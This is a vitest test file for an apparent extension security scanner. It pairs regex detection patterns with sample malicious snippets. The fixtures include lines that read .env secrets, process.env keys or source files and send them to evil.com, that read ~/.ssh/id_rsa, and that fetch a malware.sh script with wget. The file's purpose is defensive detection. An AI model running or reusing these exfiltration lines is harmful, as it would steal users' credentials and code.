import { describe, expect, it } from 'vitest';
import { RiskFactor, TrustSignal } from '../types';

interface Pattern {
  id: string;
  name: string;
  severity: string;
  points: number;
  patterns: RegExp[];
}

const PROBLEM_PATTERNS: Pattern[] = [
  {
    id: 'api-key-steal',
    name: 'API key theft',
    severity: 'critical',
    points: 35,
    patterns: [
      /fs\.readFile(?:Sync)?\s*\([^)]*\.(?:env|config|secret|credential|key|token|pem)/i,
      /process\.env\b[\s\S]{0,300}?(?:fetch|axios|https?\.request|child_process)/,
      /atob\s*\(process\.env/,
    ],
  },
  {
    id: 'code-exfil',
    name: 'Source code exfil',
    severity: 'critical',
    points: 40,
    patterns: [
      /readFile(?:Sync)?\s*\([\s\S]{0,200}?(?:fetch|axios|https?\.request)/,
      /readdir(?:Sync)?\s*[\s\S]{0,200}?(?:fetch|axios|post)/,
    ],
  },
  {
    id: 'config-exfil',
    name: 'Config reading',
    severity: 'high',
    points: 20,
    patterns: [
      /readFile(?:Sync)?\s*\([^)]*['"`][^'"`]*\.env/i,
      /readFile(?:Sync)?\s*\([^)]*['"`][^'"`]*id_rsa/i,
    ],
  },
  {
    id: 'file-mod',
    name: 'File modification',
    severity: 'high',
    points: 18,
    patterns: [
      /writeFile(?:Sync)?\s*\([^)]*\.[^)]{2,4}\s*,/,
      /writeFile(?:Sync)?\s*\([^)]*(?:src|dist|build|lib)/i,
    ],
  },
  {
    id: 'download-exec',
    name: 'Downloads remote executable',
    severity: 'critical',
    points: 40,
    patterns: [
      /\.download\s*\(\s*['"]https?:\/\/[^'"]*\.(?:exe|bin|sh|bat)['"]/,
      /wget\s+/,
    ],
  },
  {
    id: 'suspicious-version-jump',
    name: 'Suspicious version pattern',
    severity: 'medium',
    points: 12,
    patterns: [/\bv?(?:99|100|999|666)\b/, /version\s*['"`]\d+\.0\.0['"`]/],
  },
];

function matchesAny(content: string, patterns: RegExp[]): boolean {
  return patterns.some((p) => p.test(content));
}

describe('Problem Statement Detection', () => {
  it('detects API key theft: readFile + .env', () => {
    const code =
      'const key = fs.readFileSync(".env.local", "utf8"); fetch("https://evil.com/steal?k=" + key)';
    expect(matchesAny(code, PROBLEM_PATTERNS[0].patterns)).toBe(true);
  });

  it('detects API key theft: process.env + fetch', () => {
    const code =
      'const apikey = process.env.SECRET_KEY; fetch("https://evil.com/x?k=" + apikey)';
    expect(matchesAny(code, PROBLEM_PATTERNS[0].patterns)).toBe(true);
  });

  it('detects source code exfil: readFile + http.request', () => {
    const code =
      'const src = fs.readFileSync("src/app.ts", "utf8"); http.request({ host: "evil.com", path: "/steal?d=" + src })';
    expect(matchesAny(code, PROBLEM_PATTERNS[1].patterns)).toBe(true);
  });

  it('detects config exfil: reading .env', () => {
    const code = 'fs.readFileSync(".env", "utf8")';
    expect(matchesAny(code, PROBLEM_PATTERNS[2].patterns)).toBe(true);
  });

  it('detects config exfil: reading id_rsa', () => {
    const code = 'fs.readFileSync("/Users/me/.ssh/id_rsa", "utf8")';
    expect(matchesAny(code, PROBLEM_PATTERNS[2].patterns)).toBe(true);
  });

  it('detects file modification: writeFile to src/', () => {
    const code = 'fs.writeFileSync("src/injected.js", payload)';
    expect(matchesAny(code, PROBLEM_PATTERNS[3].patterns)).toBe(true);
  });

  it('detects download and execute: wget + .sh', () => {
    const code = 'exec("wget https://evil.com/malware.sh")';
    expect(matchesAny(code, PROBLEM_PATTERNS[4].patterns)).toBe(true);
  });

  it('detects suspicious version jump', () => {
    const code = 'export const version = "99.0.0"';
    expect(matchesAny(code, PROBLEM_PATTERNS[5].patterns)).toBe(true);
  });

  it('does not false-positive on safe code', () => {
    const code =
      'const fs = require("fs"); fs.readFileSync("data.txt", "utf8"); console.log(data)';

    for (const pattern of PROBLEM_PATTERNS) {
      if (pattern.id === 'file-mod') {
        expect(matchesAny(code, pattern.patterns)).toBe(false);
      }
    }
  });
});

describe('Marketplace Reputation Detection (unit)', () => {
  it('detects version jumps: major jump 5+', () => {
    const versions = ['1.0.0', '2.0.0', '10.0.0'];

    const jumps: string[] = [];
    for (let i = 1; i < versions.length; i++) {
      const prevP = versions[i - 1].split('.').map(Number);
      const currP = versions[i].split('.').map(Number);
      if (currP[0] - prevP[0] >= 5)
        jumps.push(`Major jump: ${versions[i - 1]} → ${versions[i]}`);
    }
    expect(jumps.length).toBeGreaterThan(0);
    expect(jumps[0]).toContain('10.0.0');
  });

  it('detects version rollback', () => {
    const versions = ['2.0.0', '1.5.0', '3.0.0'];
    const jumps: string[] = [];
    for (let i = 1; i < versions.length; i++) {
      const prevP = versions[i - 1].split('.').map(Number);
      const currP = versions[i].split('.').map(Number);
      if (currP[0] < prevP[0])
        jumps.push(`Version rollback: ${versions[i - 1]} → ${versions[i]}`);
    }
    expect(jumps.length).toBeGreaterThan(0);
    expect(jumps[0]).toContain('rollback');
  });

  it('high install count trust signal threshold', () => {
    const downloads = 1500000;
    expect(downloads > 1000000).toBe(true);
  });

  it('low install count risk factor threshold', () => {
    const downloads = 500;
    expect(downloads < 1000).toBe(true);
  });

  it('detects publisher change gap > 24 months', () => {
    const time: Record<string, string> = {
      '1.0.0': '2020-01-01',
      '1.1.0': '2020-06-01',
      '2.0.0': '2025-01-01',
    };
    const versions = Object.keys(time)
      .filter((k) => k !== 'created' && k !== 'modified')
      .sort(
        (a, b) => new Date(time[a]).getTime() - new Date(time[b]).getTime(),
      );
    const latestVersion = versions[versions.length - 1];
    const prevVersion = versions[versions.length - 2];
    const gapMonths =
      (new Date(time[latestVersion]).getTime() -
        new Date(time[prevVersion]).getTime()) /
      (1000 * 60 * 60 * 24 * 30);
    expect(gapMonths > 24).toBe(true);
  });
});

describe('Integration: Scan lifecycle', () => {
  it('full scan lifecycle: get extensions → scan → reports', async () => {
    const mockFactors: RiskFactor[] = [
      {
        id: 'child-process',
        title: 'Shell execution',
        description: 'Uses child_process',
        severity: 'high',
        points: 20,
      },
      {
        id: 'network-access',
        title: 'Network requests',
        description: 'Makes network requests',
        severity: 'medium',
        points: 15,
      },
    ];
    const mockSignals: TrustSignal[] = [
      {
        id: 'known-publisher',
        title: 'Known publisher',
        description: 'Well-known',
        points: -10,
      },
    ];

    let totalScore = 0;
    for (const f of mockFactors) totalScore += f.points;
    for (const s of mockSignals) totalScore += s.points;
    totalScore = Math.max(0, Math.min(100, totalScore));

    expect(totalScore).toBe(25);

    const mockReport = {
      id: 'test.ext',
      name: 'Test Extension',
      publisher: 'test',
      version: '1.0.0',
      riskScore: totalScore,
      riskLevel: totalScore <= 25 ? 'low' : 'moderate',
      riskFactors: mockFactors,
      trustSignals: mockSignals,
      recommendation: totalScore <= 25 ? 'Safe' : 'Review',
    };

    expect(mockReport.riskLevel).toBe('low');
    expect(mockReport.recommendation).toBe('Safe');
  });

  it('calculate risk from mixed factors and signals', () => {
    const factors: RiskFactor[] = [
      {
        id: 'malicious',
        title: 'Critical risk',
        description: 'Critical',
        severity: 'critical',
        points: 30,
      },
      {
        id: 'high1',
        title: 'High risk',
        description: 'High',
        severity: 'high',
        points: 25,
      },
    ];
    const signals: TrustSignal[] = [
      { id: 'trust1', title: 'Trust', description: 'Trust', points: -10 },
      { id: 'trust2', title: 'Trust2', description: 'Trust2', points: -5 },
    ];
    let score = 0;
    for (const f of factors) score += f.points;
    for (const s of signals) score += s.points;
    score = Math.max(0, Math.min(100, score));
    expect(score).toBe(40);
  });

  it('export format routing (simulated)', () => {
    const formats = ['markdown', 'json', 'html', 'csv', 'sarif'];

    for (const format of formats) {
      expect(format).toBeTruthy();
    }

    const extMap: Record<string, string> = {
      markdown: 'md',
      json: 'json',
      html: 'html',
      csv: 'csv',
      sarif: 'sarif.json',
    };

    expect(extMap['markdown']).toBe('md');
    expect(extMap['sarif']).toBe('sarif.json');
  });
});
